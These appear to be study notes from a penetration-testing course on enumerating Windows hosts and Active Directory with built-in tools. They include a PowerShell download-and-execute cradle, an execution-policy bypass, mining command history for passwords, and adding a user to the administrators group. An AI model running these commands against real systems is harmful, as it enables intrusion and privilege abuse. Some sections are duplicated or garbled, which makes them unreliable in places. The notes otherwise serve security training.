## Table of Contents

  - [Table of Contents](#Table\of\Contents)
  - [Env Commands For Host & Network Recon](#Env\Commands\For\Host\&\Network\Recon)
      - [Basic Enumeration Commands](#Basic\Enumeration\Commands)
- [PS Cmd-Lets](#ps\cmd-lets)
      - [Downgrade Powershell](#Downgrade\Powershell)
    - [Checking Defenses](#Checking\Defenses)
      - [Firewall Checks](#Firewall\Checks)
      - [Windows Defender Check (from CMD.exe)](#Windows\Defender\Check\(from\CMD.exe))
      - [Get-MpComputerStatus](#Get-MpComputerStatus)
  - [Am I Alone?](#Am\I\Alone?)
      - [Using qwinsta](#Using\qwinsta)
  - [Network Information](#Network\Information)
      - [Firewall Checks](#Firewall\Checks)
      - [Windows Defender Check (from CMD.exe)](#Windows\Defender\Check\(from\CMD.exe))
      - [Get-MpComputerStatus](#Get-MpComputerStatus)
- [Windows Management Intrsumentation](#windows\management\intrsumentation)
      - [Quick WMI checks](#Quick\WMI\checks)
  - [Net Commands](#Net\Commands)
      - [Table of Useful Net Commands](#Table\of\Useful\Net\Commands)
      - [Listing Domain Groups](#Listing\Domain\Groups)
      - [Information about a Domain User](#Information\about\a\Domain\User)
      - [Dsquery DLL](#Dsquery\DLL)
      - [User Search](#User\Search)
      - [Computer Search](#Computer\Search)
      - [Wildcard Search](#Wildcard\Search)
      - [Users With Specific Attributes Set (PASSWD_NOTREQD)](#Users\With\Specific\Attributes\Set\(PASSWD_NOTREQD))
      - [UAC Values](#UAC\Values)
      - [OID match strings](#OID\match\strings)
      - [Logical Operators](#Logical\Operators)

## Table of Contents

  - [Env Commands For Host & Network Recon](#Env\Commands\For\Host\&\Network\Recon)
      - [Basic Enumeration Commands](#Basic\Enumeration\Commands)
- [PS Cmd-Lets](#ps\cmd-lets)
      - [Downgrade Powershell](#Downgrade\Powershell)
    - [Checking Defenses](#Checking\Defenses)
      - [Firewall Checks](#Firewall\Checks)
      - [Windows Defender Check (from CMD.exe)](#Windows\Defender\Check\(from\CMD.exe))
      - [Get-MpComputerStatus](#Get-MpComputerStatus)
  - [Am I Alone?](#Am\I\Alone?)
      - [Using qwinsta](#Using\qwinsta)
  - [Network Information](#Network\Information)
      - [Firewall Checks](#Firewall\Checks)
      - [Windows Defender Check (from CMD.exe)](#Windows\Defender\Check\(from\CMD.exe))
      - [Get-MpComputerStatus](#Get-MpComputerStatus)
- [Windows Management Intrsumentation](#windows\management\intrsumentation)
      - [Quick WMI checks](#Quick\WMI\checks)
  - [Net Commands](#Net\Commands)
      - [Table of Useful Net Commands](#Table\of\Useful\Net\Commands)
      - [Listing Domain Groups](#Listing\Domain\Groups)
      - [Information about a Domain User](#Information\about\a\Domain\User)
      - [Dsquery DLL](#Dsquery\DLL)
      - [User Search](#User\Search)
      - [Computer Search](#Computer\Search)
      - [Wildcard Search](#Wildcard\Search)
      - [Users With Specific Attributes Set (PASSWD_NOTREQD)](#Users\With\Specific\Attributes\Set\(PASSWD_NOTREQD))
      - [UAC Values](#UAC\Values)
      - [OID match strings](#OID\match\strings)
      - [Logical Operators](#Logical\Operators)


## Env Commands For Host & Network Recon

First, we'll cover a few basic environmental commands that can be used to give us more information about the host we are on.

#### Basic Enumeration Commands

|**Command**|**Result**|
|---|---|
|`hostname`|Prints the PC's Name|
|`[System.Environment]::OSVersion.Version`|Prints out the OS version and revision level|
|`wmic qfe get Caption,Description,HotFixID,InstalledOn`|Prints the patches and hotfixes applied to the host|
|`ipconfig /all`|Prints out network adapter state and configurations|
|`set`|Displays a list of environment variables for the current session (ran from CMD-prompt)|
|`echo %USERDOMAIN%`|Displays the domain name to which the host belongs (ran from CMD-prompt)|
|`echo %logonserver%`|Prints out the name of the Domain controller the host checks in with (ran from CMD-prompt)|


# PS Cmd-Lets

|**Cmd-Let**|**Description**|
|---|---|
|`Get-Module`|Lists available modules loaded for use.|
|`Get-ExecutionPolicy -List`|Will print the [execution policy](https://docs.microsoft.com/en-us/powershell/module/microsoft.powershell.core/about/about_execution_policies?view=powershell-7.2) settings for each scope on a host.|
|`Set-ExecutionPolicy Bypass -Scope Process`|This will change the policy for our current process using the `-Scope` parameter. Doing so will revert the policy once we vacate the process or terminate it. This is ideal because we won't be making a permanent change to the victim host.|
|`Get-Content C:\Users\<USERNAME>\AppData\Roaming\Microsoft\Windows\Powershell\PSReadline\ConsoleHost_history.txt`|With this string, we can get the specified user's PowerShell history. This can be quite helpful as the command history may contain passwords or point us towards configuration files or scripts that contain passwords.|
|`Get-ChildItem Env: \| ft Key,Value`|Return environment values such as key paths, users, computer information, etc.|
|`powershell -nop -c "iex(New-Object Net.WebClient).DownloadString('URL to download the file from'); <follow-on commands>"`|
#### Downgrade Powershell

  Downgrade Powershell

```powershell-session
PS C:\htb> Get-host
```

 The primary place to look is in the `PowerShell Operational Log` found under `Applications and Services Logs > Microsoft > Windows > PowerShell > Operational`. All commands executed in our session will log to this file. The `Windows PowerShell` log located at `Applications and Services Logs > Windows PowerShell` is also a good place to check. An entry will be made here when we start an instance of PowerShell.

### Checking Defenses

The next few commands utilize the [netsh](https://docs.microsoft.com/en-us/windows-server/networking/technologies/netsh/netsh-contexts) and [sc](https://docs.microsoft.com/en-us/windows-server/administration/windows-commands/sc-query) utilities to help us get a feel for the state of the host when it comes to Windows Firewall settings and to check the status of Windows Defender.

#### Firewall Checks

  Firewall Checks

```powershell-session
PS C:\htb> netsh advfirewall show allprofiles
```


#### Windows Defender Check (from CMD.exe)

  Windows Defender Check (from CMD.exe)

```cmd-session
C:\htb> sc query windefend
```

Above, we checked if Defender was running. Below we will check the status and configuration settings with the [Get-MpComputerStatus](https://docs.microsoft.com/en-us/powershell/module/defender/get-mpcomputerstatus?view=windowsserver2022-ps) cmdlet in PowerShell.

#### Get-MpComputerStatus

  Get-MpComputerStatus

```powershell-session
PS C:\htb> Get-MpComputerStatus
```

## Am I Alone?

When landing on a host for the first time, one important thing is to check and see if you are the only one logged in. If you start taking actions from a host someone else is on, there is the potential for them to notice you. If a popup window launches or a user is logged out of their session, they may report these actions or change their password, and we could lose our foothold.

#### Using qwinsta

  Using qwinsta

```powershell-session
PS C:\htb> qwinsta
```

## Network Information

|**Networking Commands**|**Description**|
|---|---|
|`arp -a`|Lists all known hosts stored in the arp table.|
|`ipconfig /all`|Prints out adapter settings for the host. We can figure out the network segment from here.|
|`route print`|Displays the routing table (IPv4 & IPv6) identifying known networks and layer three routes shared with the host.|
|`netsh advfirewall show state`|Displays the status of the host's firewall. We can determine if it is active and filtering traffic.|


#### Firewall Checks

```powershell-session
PS C:\htb> netsh advfirewall show allprofiles
```

#### Windows Defender Check (from CMD.exe)

```cmd-session
C:\htb> sc query windefend
```

Above, we checked if Defender was running. Below we will check the status and configuration settings with the [Get-MpComputerStatus](https://docs.microsoft.com/en-us/powershell/module/defender/get-mpcomputerstatus?view=windowsserver2022-ps) cmdlet in PowerShell.

#### Get-MpComputerStatus

```powershell-session
PS C:\htb> Get-MpComputerStatus
```

# Windows Management Intrsumentation

#### Quick WMI checks

|**Command**|**Description**|
|---|---|
|`wmic qfe get Caption,Description,HotFixID,InstalledOn`|Prints the patch level and description of the Hotfixes applied|
|`wmic computersystem get Name,Domain,Manufacturer,Model,Username,Roles /format:List`|Displays basic host information to include any attributes within the list|
|`wmic process list /format:list`|A listing of all processes on host|
|`wmic ntdomain list /format:list`|Displays information about the Domain and Domain Controllers|
|`wmic useraccount list /format:list`|Displays information about all local accounts and any domain accounts that have logged into the device|
|`wmic group list /format:list`|Information about all local groups|
|`wmic sysaccount list /format:list`|Dumps information about any system accounts that are being used as service accounts.|

Below we can see information about the domain and the child domain, and the external forest that our current domain has a trust with. This [cheatsheet](https://gist.github.com/xorrior/67ee741af08cb1fc86511047550cdaf4) has some useful commands for querying host and domain info using wmic.

```powershell-session
PS C:\htb> wmic ntdomain get Caption,Description,DnsForestName,DomainName,DomainControllerAddress

```

## Net Commands

[Net](https://docs.microsoft.com/en-us/windows/win32/winsock/net-exe-2) commands can be beneficial to us when attempting to enumerate information from the domain.
- Local and domain users
- Groups
- Hosts
- Specific users in groups
- Domain Controllers
- Password requirements

#### Table of Useful Net Commands

|**Command**|**Description**|
|---|---|
|`net accounts`|Information about password requirements|
|`net accounts /domain`|Password and lockout policy|
|`net group /domain`|Information about domain groups|
|`net group "Domain Admins" /domain`|List users with domain admin privileges|
|`net group "domain computers" /domain`|List of PCs connected to the domain|
|`net group "Domain Controllers" /domain`|List PC accounts of domains controllers|
|`net group <domain_group_name> /domain`|User that belongs to the group|
|`net groups /domain`|List of domain groups|
|`net localgroup`|All available groups|
|`net localgroup administrators /domain`|List users that belong to the administrators group inside the domain (the group `Domain Admins` is included here by default)|
|`net localgroup Administrators`|Information about a group (admins)|
|`net localgroup administrators [username] /add`|Add user to administrators|
|`net share`|Check current shares|
|`net user <ACCOUNT_NAME> /domain`|Get information about a user within the domain|
|`net user /domain`|List all users of the domain|
|`net user %username%`|Information about the current user|
|`net use x: \computer\share`|Mount the share locally|
|`net view`|Get a list of computers|
|`net view /all /domain[:domainname]`|Shares on the domains|
|`net view \computer /ALL`|List shares of a computer|
|`net view /domain`|List of PCs of the domain|

#### Listing Domain Groups
```powershell
PS C:\htb> net group /domain
```

We can see above the `net group` command provided us with a list of groups within the domain.

#### Information about a Domain User

```powershell
PS C:\htb> net user /domain wrouse
```

[Dsquery](https://docs.microsoft.com/en-us/previous-versions/windows/it-pro/windows-server-2012-r2-and-2012/cc732952(v=ws.11)) is a helpful command-line tool that can be utilized to find Active Directory objects. The queries we run with this tool can be easily replicated with tools like BloodHound and PowerView, but we may not always have those tools at our disposal, as discussed at the beginning of the section. But, it is a likely tool that domain sysadmins are utilizing in their environment. With that in mind, `dsquery` will exist on any host with the `Active Directory Domain Services Role` installed, and the `dsquery` DLL exists on all modern Windows systems by default now and can be found at `C:\Windows\System32\dsquery.dll`.

#### Dsquery DLL

All we need is elevated privileges on a host or the ability to run an instance of Command Prompt or PowerShell from a `SYSTEM` context. Below, we will show the basic search function with `dsquery` and a few helpful search filters.

#### User Search

```powershell
PS C:\htb> dsquery user
```


#### Computer Search

```powershell
PS C:\htb> dsquery computer
```

#### Wildcard Search

```powershell
PS C:\htb> dsquery * "CN=Users,DC=INLANEFREIGHT,DC=LOCAL"
```

We can, of course, combine `dsquery` with LDAP search filters of our choosing. The below looks for users with the `PASSWD_NOTREQD` flag set in the `userAccountControl` attribute.

#### Users With Specific Attributes Set (PASSWD_NOTREQD)

```powershell
PS C:\htb> dsquery * -filter "(&(objectCategory=person)(objectClass=user)(userAccountControl:1.2.840.113556.1.4.803:=32))" -attr distinguishedName userAccountControl
```
```powershell
PS C:\Users\forend.INLANEFREIGHT> dsquery * -filter "(userAccountControl:1.2.840.113556.1.4.803:=8192)" -limit 5 -attr sAMAccountName

```

You will notice in the queries above that we are using strings such as `userAccountControl:1.2.840.113556.1.4.803:=8192`. These strings are common LDAP queries that can be used with several different tools too, including AD PowerShell, ldapsearch, and many others. Let's break them down quickly:

`userAccountControl:1.2.840.113556.1.4.803:` Specifies that we are looking at the [User Account Control (UAC) attributes](https://docs.microsoft.com/en-us/troubleshoot/windows-server/identity/useraccountcontrol-manipulate-account-properties) for an object. This portion can change to include three different values we will explain below when searching for information in AD (also known as [Object Identifiers (OIDs)](https://ldap.com/ldap-oid-reference-guide/).  
`=8192` represents the decimal bitmask we want to match in this search. This decimal number corresponds to a corresponding UAC Attribute flag that determines if an attribute like `password is not required` or `account is locked` is set. These values can compound and make multiple different bit entries. Below is a quick list of potential values.


#### UAC Values

![text](https://academy.hackthebox.com/storage/modules/143/UAC-values.png)

#### OID match strings

OIDs are rules used to match bit values with attributes, as seen above. For LDAP and AD, there are three main matching rules:

1. `1.2.840.113556.1.4.803`

When using this rule as we did in the example above, we are saying the bit value must match completely to meet the search requirements. Great for matching a singular attribute.

2. `1.2.840.113556.1.4.804`

When using this rule, we are saying that we want our results to show any attribute match if any bit in the chain matches. This works in the case of an object having multiple attributes set.

3. `1.2.840.113556.1.4.1941`

This rule is used to match filters that apply to the Distinguished Name of an object and will search through all ownership and membership entries.


#### Logical Operators

When building out search strings, we can utilize logical operators to combine values for the search. The operators `&` `|` and `!` are used for this purpose. For example we can combine multiple [search criteria](https://learn.microsoft.com/en-us/windows/win32/adsi/search-filter-syntax) with the `& (and)` operator like so:  
`(&(objectClass=user)(userAccountControl:1.2.840.113556.1.4.803:=64))`

The above example sets the first criteria that the object must be a user and combines it with searching for a UAC bit value of 64 (Password Can't Change). A user with that attribute set would match the filter. You can take this even further and combine multiple attributes like `(&(1) (2) (3))`. The `!` (not) and `|` (or) operators can work similarly. For example, our filter above can be modified as follows:  
`(&(objectClass=user)(!userAccountControl:1.2.840.113556.1.4.803:=64))`


Enumerate the host's security configuration information and provide its AMProductVersion.
```
Get-MpComputerStatus
```



